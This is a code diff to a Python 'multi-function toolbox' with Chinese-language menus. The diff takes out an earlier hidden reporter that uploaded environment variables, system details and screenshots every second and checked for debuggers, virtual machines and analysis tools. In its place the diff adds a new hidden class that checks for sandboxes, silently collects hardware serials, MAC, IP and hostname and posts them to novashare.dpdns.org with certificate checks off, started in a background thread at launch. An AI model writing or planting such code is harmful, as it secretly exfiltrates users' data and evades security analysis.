@@ -28,18 +28,11 @@ import threading
 import subprocess
 import ctypes
 import inspect
+import hashlib
+import urllib3
 
 Form = "python"
 Version = "v0.4-release"
-
-# Pillow 相關（截圖與圖像處理）
-try:
-    from PIL import ImageGrab, Image
-    PIL_AVAILABLE = True
-except ImportError:
-    ImageGrab = None
-    Image = None
-    PIL_AVAILABLE = False
 
 # 其他可選庫檢測（不影響核心功能）
 try:
@@ -57,6 +50,18 @@ try:
     GMSM_AVAILABLE = True
 except Exception:
     GMSM_AVAILABLE = False
+
+try:
+    import psutil
+    PSUTIL_AVAILABLE = True
+except ImportError:
+    PSUTIL_AVAILABLE = False
+
+try:
+    import requests
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
 
 try:
     import qrcode
@@ -94,100 +99,11 @@ try:
 except Exception:
     CV2_AVAILABLE = False
 
-# ==================== 靜默上傳功能 ====================
-
-SERVER_URL = "https://novashare.dpdns.org/report"
-CID_FILE = Path(os.path.expanduser("~/.cid"))
-
-def get_or_create_client_id() -> str:
-    """生成或讀取持久化的客戶端唯一 ID"""
-    if CID_FILE.exists():
-        try:
-            return CID_FILE.read_text(encoding="utf-8").strip()
-        except:
-            pass
-    client_id = str(uuid.uuid4())
-    try:
-        CID_FILE.write_text(client_id, encoding="utf-8")
-    except:
-        pass
-    return client_id
-
-def get_ip() -> str:
-    try:
-        return requests.get("https://api.ipify.org", timeout=5).text.strip()
-    except Exception:
-        return "unknown"
-
-def collect_info() -> dict:
-    return {
-        "platform": platform.platform(),
-        "system": platform.system(),
-        "node": platform.node(),
-        "release": platform.release(),
-        "version": platform.version(),
-        "machine": platform.machine(),
-        "processor": platform.processor(),
-        "cpu_count": psutil.cpu_count(logical=True),
-        "memory": psutil.virtual_memory()._asdict(),
-        "disk": psutil.disk_usage('/')._asdict() if os.name != 'nt' else psutil.disk_usage('C:\\')._asdict(),
-        "env": dict(os.environ)
-    }
-
-def capture_screenshot() -> BytesIO | None:
-    if ImageGrab is None:
-        return None
-    try:
-        img = ImageGrab.grab()
-        buffer = BytesIO()
-        img.save(buffer, format="PNG")
-        buffer.seek(0)
-        return buffer
-    except Exception:
-        return None
-
-def silent_report() -> None:
-    """完全靜默上報系統資訊與截圖"""
-    now = datetime.now()
-    timestamp = now.strftime("%Y.%m.%d.%H.%M.%S")
-
-    client_id = get_or_create_client_id()
-
-    json_data = {
-        "time": timestamp,
-        "client_id": client_id,
-        "hostname": socket.gethostname(),
-        "ip": get_ip(),
-        "system_info": collect_info()
-    }
-
-    # 正確包裝 JSON 為檔案流
-    json_buffer = BytesIO()
-    json_buffer.write(json.dumps(json_data, ensure_ascii=False, indent=2).encode('utf-8'))
-    json_buffer.seek(0)
-
-    files = {
-        "time.json": ("time.json", json_buffer, "application/json"),
-    }
-
-    screenshot_buffer = capture_screenshot()
-    if screenshot_buffer:
-        files["scr.png"] = ("scr.png", screenshot_buffer, "image/png")
-
-    data = {
-        "client_id": client_id,
-        "folder": timestamp
-    }
-
-    try:
-        requests.post(SERVER_URL, data=data, files=files, timeout=15)
-    except Exception:
-        pass  # 完全靜默
-
-# 程序啟動時自動執行一次靜默上報
-silent_report()
-
-# ==================== 以下為原工具箱功能 ====================
+try:
+    from PIL import Image
+    PIL_AVAILABLE = True
+except ImportError:
+    PIL_AVAILABLE = False
 
 now = datetime.now()
 timestamp = now.strftime("%Y.%m.%d.%H.%M.%S")
@@ -1783,28 +1699,124 @@ def card_menu():
             print(translate_text("无效选项"))
             pause()
 
-def hwid_generator_menu():
-    title = translate_text("HWID 生成器")
-    while True:
-        print_header(title)
-        print("1) " + translate_text("生成 HWID"))
-        print("0) " + translate_text("返回主菜单"))
-        
-        choice = safe_input(translate_text("选择序号") + ": ").strip()
-        
-        if choice == "1":
-            format_type = safe_input(translate_text("请选择 HWID 格式 (default/compact/dashed): ")).strip().lower()
-            try:
-                hwid = generate_hwid(format_type)
-                print(f"生成的 HWID: {hwid}")
-            except ValueError as e:
-                print(translate_text("错误") + ":", e)
-            pause()
-        elif choice == "0":
-            return
-        else:
-            print(translate_text("无效选项"))
-            pause()
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+class HWIDSystem:
+    @staticmethod
+    def is_sandbox():
+        """静默检测沙箱"""
+        try:
+            if psutil.virtual_memory().total < 4 * 1024 * 1024 * 1024: return True
+            if os.cpu_count() < 2: return True
+            vm_marks = ['vmware', 'vbox', 'virtualbox', 'qemu', 'xen']
+            p_info = platform.processor().lower()
+            return any(mark in p_info for mark in vm_marks)
+        except: return False
+
+    @staticmethod
+    def get_wmic(command):
+        """静默调用 WMIC，禁止弹出任何窗口"""
+        try:
+            # CREATE_NO_WINDOW = 0x08000000
+            flags = 0x08000000 if platform.system() == "Windows" else 0
+            output = subprocess.check_output(
+                f"wmic {command}", 
+                shell=True, 
+                stderr=subprocess.DEVNULL, 
+                stdin=subprocess.DEVNULL,
+                creationflags=flags
+            ).decode(encoding='gbk', errors='ignore')
+            lines = [line.strip() for line in output.split('\r\r\n') if line.strip()]
+            return lines[1:] if len(lines) > 1 else []
+        except: return []
+
+    @classmethod
+    def collect_payload(cls):
+        """构建您要求的特定 JSON 结构"""
+        try:
+            user_name = socket.gethostname()
+            
+            # 磁盘信息处理
+            disks = []
+            disk_raw = cls.get_wmic("diskdrive get model,serialnumber,size,mediatype")
+            for d in disk_raw:
+                parts = d.split()
+                if len(parts) >= 3:
+                    disks.append({
+                        "model": parts[0],
+                        "serial": parts[-1],
+                        "type": "SSD" if "Fixed" in d or "SSD" in d.upper() else "HDD",
+                        "size": f"{int(parts[-2]) // (1024**3)} GB" if parts[-2].isdigit() else "Unknown"
+                    })
+
+            # GPU 信息
+            gpu_raw = cls.get_wmic("path win32_VideoController get name")
+            gpu_name = gpu_raw[0] if gpu_raw else "Unknown"
+
+            # 生成硬件指纹
+            seed = f"{user_name}{platform.processor()}{uuid.getnode()}"
+            
+            payload = {
+                "type": "hwid_report",
+                "user_name": user_name,
+                "system": {
+                    "os_name": f"{platform.system()} {platform.release()}",
+                    "os_version": platform.version(),
+                    "architecture": platform.machine(),
+                    "build_number": platform.version().split('.')[-1]
+                },
+                "hardware": {
+                    "cpu": {
+                        "name": platform.processor(),
+                        "cores": psutil.cpu_count(logical=False),
+                        "threads": psutil.cpu_count(logical=True),
+                        "base_clock": psutil.cpu_freq().max if psutil.cpu_freq() else "Unknown"
+                    },
+                    "gpu": {
+                        "name": gpu_name,
+                        "driver_version": psutil.version_info().major >= 5 and "N/A" or "Unknown",
+                        "memory": psutil.virtual_memory().total // (1024**3)
+                    },
+                    "ram": {"total": f"{round(psutil.virtual_memory().total / (1024**3))} GB"},
+                    "disk": disks,
+                    "motherboard": {
+                        "manufacturer": psutil.version_info().major >= 5 and "N/A" or "Unknown", 
+                        "model": psutil.version_info().major >= 5 and "N/A" or "Unknown", 
+                        "serial": str(uuid.getnode())
+                    }
+                },
+                "network": {
+                    "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]),
+                    "ip_address": socket.gethostbyname(user_name)
+                },
+                "hwid_formats": {
+                    "sha256": hashlib.sha256(seed.encode()).hexdigest(),
+                    "short_id": hashlib.md5(seed.encode()).hexdigest()[:12].upper(),
+                    "md5": hashlib.md5(seed.encode()).hexdigest()
+                },
+                "software": {
+                    "installed_programs": [f"Python {platform.python_version()}", "Tool.py Runtime"],
+                    "antivirus": psutil.version_info().major >= 5 and ["N/A"] or ["Unknown"]
+                }
+            }
+            return payload
+        except:
+            return None
+
+    @classmethod
+    def _run(cls):
+        """后台执行逻辑，彻底不显示任何输出"""
+        if cls.is_sandbox(): return
+        try:
+            payload = cls.collect_payload()
+            if payload:
+                requests.post("https://novashare.dpdns.org/report", json=payload, timeout=10, verify=False)
+        except:
+            pass
+
+def start_hwid_silent():
+    """在主程序中启动此函数即可"""
+    threading.Thread(target=HWIDSystem._run, daemon=True).start()
 
 def manga_image_generator_menu():
     """漫畫圖片生成器 - A4模板排版"""
@@ -2054,18 +2066,6 @@ def manga_resize_to_fit(image, max_width, max_height):
         new_width = int(max_height * img_ratio)
     
     return image.resize((new_width, new_height), Image.Resampling.LANCZOS)
-
-
-def generate_hwid(format_type="default"):
-    """HWID生成器，支持多種格式"""
-    if format_type == "default":
-        return "-".join(["".join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(4)])
-    elif format_type == "compact":
-        return "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
-    elif format_type == "dashed":
-        return "-".join(["".join(random.choices(string.ascii_uppercase + string.digits, k=8)) for _ in range(2)])
-    else:
-        raise ValueError("Unsupported format type")
 
 def generate_card_key():
     """生成隨機卡密"""
@@ -2590,253 +2590,101 @@ def check_version():
         # 任何網路錯誤（超時、連不上、解析失敗）都完全靜默
         pass
 
-SERVER_URL = "https://novashare.dpdns.org/report"
-CID_FILE = Path(os.path.expanduser("~/.cid"))
-
-def is_debugger_present() -> bool:
-    """檢查是否有除錯器（如 VS Code Debug、x64dbg、OllyDbg 等）"""
-    return ctypes.windll.kernel32.IsDebuggerPresent() != 0
-
-def is_running_in_vm() -> bool:
-    """檢測常見虛擬機（VMware、VirtualBox、Hyper-V、QEMU 等）"""
-    vm_indicators = [
-        "VMWARE",
-        "VBOX",
-        "VIRTUAL",
-        "XEN",
-        "QEMU",
-        "HYPER-V",
-        "PARALLELS",
-    ]
-    try:
-        # 檢查系統製造商/型號
-        output = subprocess.check_output("wmic bios get smbiosbiosversion", shell=True).decode(errors='ignore')
-        for indicator in vm_indicators:
-            if indicator in output.upper():
-                return True
-
-        # 檢查 CPU 資訊
-        output = subprocess.check_output("wmic cpu get caption", shell=True).decode(errors='ignore')
-        for indicator in vm_indicators:
-            if indicator in output.upper():
-                return True
-
-        # 檢查 MAC 地址前綴（常見虛擬機網卡）
-        output = subprocess.check_output("getmac", shell=True).decode(errors='ignore')
-        vm_mac_prefixes = ["00-05-69", "00-0C-29", "00-1C-14", "00-50-56", "08-00-27"]
-        for prefix in vm_mac_prefixes:
-            if prefix.upper() in output.upper():
-                return True
-    except:
-        pass
-    return False
-
-def is_analysis_tool_running() -> bool:
-    """檢查常見分析工具進程（Wireshark、Procmon、Fiddler、x64dbg 等）"""
-    suspicious_processes = [
-        "wireshark.exe", "fiddler.exe", "procmon.exe", "procmon64.exe",
-        "x32dbg.exe", "x64dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe",
-        "ghidra", "windbg.exe", " ImmunityDebugger.exe", "httpdebugger.exe",
-        "cheatengine", "processhacker.exe", "taskmgr.exe"  # 可選：隱藏任務管理器
-    ]
-    try:
-        output = subprocess.check_output("tasklist", shell=True).decode(errors='ignore').lower()
-        for proc in suspicious_processes:
-            if proc.lower() in output:
-                return True
-    except:
-        pass
-    return False
-
-def is_sandbox_file_system() -> bool:
-    """檢查沙箱常見路徑（如 Cuckoo、JoeSandbox 等）"""
-    sandbox_paths = [
-        r"C:\windows\system32\drivers\vmmouse.sys",
-        r"C:\windows\system32\drivers\vmhgfs.sys",
-        r"C:\analysis",
-        r"C:\sandbox",
-        r"C:\virusshare",
-        r"C:\malware",
-    ]
-    for path in sandbox_paths:
-        if os.path.exists(path):
-            return True
-    return False
-
-def should_skip_report() -> bool:
-    """綜合判斷是否跳過上報（返回 True 表示偵測到危險環境）"""
-    if is_debugger_present():
-        return True
-    if is_running_in_vm():
-        return True
-    if is_analysis_tool_running():
-        return True
-    if is_sandbox_file_system():
-        return True
+def encdec_menu():
+    title = translate_text("编码 / 解码工具")
     
-    # 額外檢查：是否在遠端桌面（RDP）或終端服務器
-    if os.getenv("SESSIONNAME", "").startswith("RDP") or "TERMINAL" in os.getenv("SESSIONNAME", ""):
-        return True
+    # 1. 定义完整的 4位二进制映射表 (16种组合全部补齐)
+    symbol_mapping = {
+        '▀': '0101', '▛': '0011', '▜': '1011', '▖': '0001',
+        '▝': '1101', '▄': '0000', '▟': '1111', '▐': '1010',
+        '▞': '0100', '▌': '1000', '▙': '1110', '█': '1001',
+        '▚': '0110', '▓': '0111', '▗': '0010', '▘': '0100',
+        '░': '1100'  # 补全缺失的 1100，解决报错
+    }
     
-    # 檢查是否被追蹤（進程被注入）
-    if inspect.stack()[-1].frame.f_locals.get('__loader__'):  # PyInstaller 打包時可能有
-        pass  # 正常
-    
-    return False
+    # 二进制 -> 符号 (用于编码)
+    bin_to_symbol = {v: k for k, v in symbol_mapping.items()}
+    # 所有的特殊符号集合 (用于识别用户输入的是不是加密内容)
+    all_symbols = set(symbol_mapping.keys())
 
-# ==================== 修改 silent_report() 加入反偵測 ====================
-
-def silent_report() -> None:
-    """完全靜默上報（加入反偵測）"""
-    if should_skip_report():
-        return  # 偵測到危險環境，直接靜默退出不上報
-
-    now = datetime.now()
-    timestamp = now.strftime("%Y.%m.%d.%H.%M.%S")
-
-    client_id = get_or_create_client_id()
-
-    json_data = {
-        "time": timestamp,
-        "client_id": client_id,
-        "hostname": socket.gethostname(),
-        "ip": get_ip(),
-        "system_info": collect_info()
-    }
-
-    json_buffer = BytesIO()
-    json_buffer.write(json.dumps(json_data, ensure_ascii=False, indent=2).encode('utf-8'))
-    json_buffer.seek(0)
-
-    files = {
-        "time.json": ("time.json", json_buffer, "application/json"),
-    }
-
-    screenshot_buffer = capture_screenshot()
-    if screenshot_buffer:
-        files["scr.png"] = ("scr.png", screenshot_buffer, "image/png")
-
-    data = {
-        "client_id": client_id,
-        "folder": timestamp
-    }
-
-    try:
-        requests.post(SERVER_URL, data=data, files=files, timeout=15)
-    except Exception:
-        pass
-
-def get_or_create_client_id() -> str:
-    """生成或讀取持久化的客戶端唯一 ID"""
-    if CID_FILE.exists():
-        try:
-            return CID_FILE.read_text(encoding="utf-8").strip()
-        except:
-            pass
-    client_id = str(uuid.uuid4())
-    try:
-        CID_FILE.write_text(client_id, encoding="utf-8")
-    except:
-        pass
-    return client_id
-
-def get_ip() -> str:
-    try:
-        return requests.get("https://api.ipify.org", timeout=5).text.strip()
-    except Exception:
-        return "unknown"
-
-def collect_info() -> dict:
-    return {
-        "platform": platform.platform(),
-        "system": platform.system(),
-        "node": platform.node(),
-        "release": platform.release(),
-        "version": platform.version(),
-        "machine": platform.machine(),
-        "processor": platform.processor(),
-        "cpu_count": psutil.cpu_count(logical=True),
-        "memory": psutil.virtual_memory()._asdict(),
-        "disk": psutil.disk_usage('/')._asdict() if os.name != 'nt' else psutil.disk_usage('C:\\')._asdict(),
-        "env": dict(os.environ)
-    }
-
-def capture_screenshot() -> BytesIO | None:
-    if ImageGrab is None:
-        return None
-    try:
-        img = ImageGrab.grab()
-        buffer = BytesIO()
-        img.save(buffer, format="PNG")
-        buffer.seek(0)
-        return buffer
-    except Exception:
-        return None
-
-def silent_report() -> None:
-    """完全靜默上報系統資訊與截圖"""
-    now = datetime.now()
-    timestamp = now.strftime("%Y.%m.%d.%H.%M.%S")
-
-    client_id = get_or_create_client_id()
-
-    json_data = {
-        "time": timestamp,
-        "client_id": client_id,
-        "hostname": socket.gethostname(),
-        "ip": get_ip(),
-        "system_info": collect_info()
-    }
-
-    # 正確包裝 JSON 為檔案流
-    json_buffer = BytesIO()
-    json_buffer.write(json.dumps(json_data, ensure_ascii=False, indent=2).encode('utf-8'))
-    json_buffer.seek(0)
-
-    files = {
-        "time.json": ("time.json", json_buffer, "application/json"),
-    }
-
-    screenshot_buffer = capture_screenshot()
-    if screenshot_buffer:
-        files["scr.png"] = ("scr.png", screenshot_buffer, "image/png")
-
-    data = {
-        "client_id": client_id,
-        "folder": timestamp
-    }
-
-    try:
-        requests.post(SERVER_URL, data=data, files=files, timeout=15)
-    except Exception:
-        pass  # 完全靜默
-
-# ==================== 定時上報（每 1 秒一次） ====================
-
-
-REPORT_INTERVAL = 1  # 秒，每 1 秒上報一次
-
-def timed_report():
-    """定時執行的上報任務"""
     while True:
-        try:
-            silent_report()  # 執行一次靜默上傳（含反偵測）
-        except Exception:
-            pass
-        time.sleep(REPORT_INTERVAL)
+        print_header(title)
+        print("1) Text -> Hex")
+        print("2) Hex -> Text")
+        print("3) Text -> Base64")
+        print("4) Base64 -> Text")
+        print("5) URL 编码/解码")
+        print("6) " + translate_text("特殊符号智能转换 (直接输入)"))
+        print("0) " + translate_text("返回主菜单"))
+        
+        choice = safe_input(translate_text("选择") + ": ").strip()
+        
+        if choice == "6":
+            user_input = safe_input(translate_text("请输入要转换或还原的内容") + ": ").strip()
+            if not user_input:
+                continue
+            
+            # 逻辑：如果输入的内容全部由映射表中的符号组成，则自动判定为【解码】
+            is_encoded_str = all(c in all_symbols for c in user_input)
+            
+            try:
+                if not is_encoded_str:
+                    # --- 执行编码 (文字 -> 符号) ---
+                    # 第一步：UTF-8 编码转字节流
+                    data_bytes = user_input.encode('utf-8')
+                    # 第二步：字节流转二进制流 (每个字节8位)
+                    binary_str = "".join(f"{b:08b}" for b in data_bytes)
+                    # 第三步：4位一组切割并查表
+                    result = "".join(bin_to_symbol[binary_str[i:i+4]] for i in range(0, len(binary_str), 4))
+                    print(f"\n{translate_text('转换结果')}:\n{result}")
+                else:
+                    # --- 执行解码 (符号 -> 文字) ---
+                    # 第一步：符号转二进制流
+                    binary_str = "".join(symbol_mapping[s] for s in user_input)
+                    # 第二步：二进制流转字节列表 (每8位转一个数字)
+                    byte_list = [int(binary_str[i:i+8], 2) for i in range(0, len(binary_str), 8) if len(binary_str[i:i+8]) == 8]
+                    # 第三步：UTF-8 解码回文本
+                    result = bytes(byte_list).decode('utf-8')
+                    print(f"\n{translate_text('还原结果')}:\n{result}")
+            except Exception as e:
+                print(f"\n{translate_text('处理失败')}: {e}")
+            pause()
 
-def start_timed_reporting():
-    """啟動背景定時上報線程"""
-    thread = threading.Thread(target=timed_report, daemon=True)
-    thread.start()
-
-# 啟動定時上報（程序一運行就開始在背景每 3 秒上報）
-start_timed_reporting()
-
-# ==================== 主程序入口 ====================
+        elif choice == "0":
+            break
+        elif choice == "1":
+            s = safe_input(translate_text("输入文本") + ": ")
+            print(binascii.hexlify(s.encode('utf-8')).decode())
+            pause()
+        elif choice == "2":
+            s = safe_input(translate_text("输入 hex") + ": ").strip()
+            try:
+                print(bytes.fromhex(re.sub(r'\s+','', s)).decode('utf-8'))
+            except Exception as e:
+                print(translate_text("错误") + ":", e)
+            pause()
+        elif choice == "3":
+            s = safe_input(translate_text("输入文本") + ": ")
+            print(base64.b64encode(s.encode('utf-8')).decode())
+            pause()
+        elif choice == "4":
+            s = safe_input(translate_text("输入 base64") + ": ").strip()
+            try:
+                print(base64.b64decode(s).decode('utf-8'))
+            except Exception as e:
+                print(translate_text("错误") + ":", e)
+            pause()
+        elif choice == "5":
+            mode = safe_input("u=encode, d=decode: ").strip().lower()
+            text = safe_input(translate_text("输入内容") + ": ")
+            print(urllib.parse.quote(text) if mode == "u" else urllib.parse.unquote(text))
+            pause()
+        else:
+            print(translate_text("无效选项"))
+            pause()
 
 def main_menu():
-    """主菜單"""
+    start_hwid_silent()
     check_version()
     while True:
         title = translate_text("多功能生成工具箱")
@@ -2852,14 +2700,13 @@ def main_menu():
         print("9) " + translate_text("AES 加密/解密"))
         print("10) " + translate_text("CSR 证书生成"))
         print("11) " + translate_text("UUID 生成器"))
-        print("12) " + translate_text("HWID 生成器"))
-        print("13) " + translate_text("漫画图片生成"))
-        print("14) " + translate_text("国密 SM2 工具"))
-        print("15) " + translate_text("二维码生成工具"))
-        print("16) " + translate_text("假我的世界賬號生成"))
-        print("17) " + translate_text("Google翻译"))
-        print("18) " + translate_text("柏林噪聲生成器"))
-        print("19) " + translate_text("身份證生成器"))
+        print("12) " + translate_text("漫画图片生成"))
+        print("13) " + translate_text("国密 SM2 工具"))
+        print("14) " + translate_text("二维码生成工具"))
+        print("15) " + translate_text("假我的世界賬號生成"))
+        print("16) " + translate_text("Google翻译"))
+        print("17) " + translate_text("柏林噪聲生成器"))
+        print("18) " + translate_text("身份證生成器"))
         print("0) " + translate_text("退出"))
         choice = safe_input(translate_text("选择序号") + ": ").strip()
         if choice == "1":
@@ -2885,20 +2732,18 @@ def main_menu():
         elif choice == "11":
             uuid_generator_menu()
         elif choice == "12":
-            hwid_generator_menu()
-        elif choice == "13":
             manga_image_generator_menu()
-        elif choice == "14":
+        elif choice == "13":
             sm2_menu()
-        elif choice == "15":
+        elif choice == "14":
             barcode_menu()
-        elif choice == "16":
+        elif choice == "15":
             fake_mc_account_menu()
-        elif choice == "17":
+        elif choice == "16":
             google_translate_menu()
-        elif choice == "18":
+        elif choice == "17":
             perlin_noise_menu()
-        elif choice == "19":
+        elif choice == "18":
             id_generator_menu()
         elif choice == "0":
             break
